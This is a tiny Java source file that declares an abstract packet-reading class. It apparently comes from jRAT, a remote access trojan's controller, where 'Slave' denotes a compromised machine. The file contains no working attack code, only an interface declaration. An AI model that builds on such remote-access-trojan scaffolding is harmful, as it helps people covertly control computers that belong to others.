package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.Slave;

public abstract class AbstractIncomingPacket {

	public abstract void read(Slave slave, DataInputStream dis) throws Exception;

}
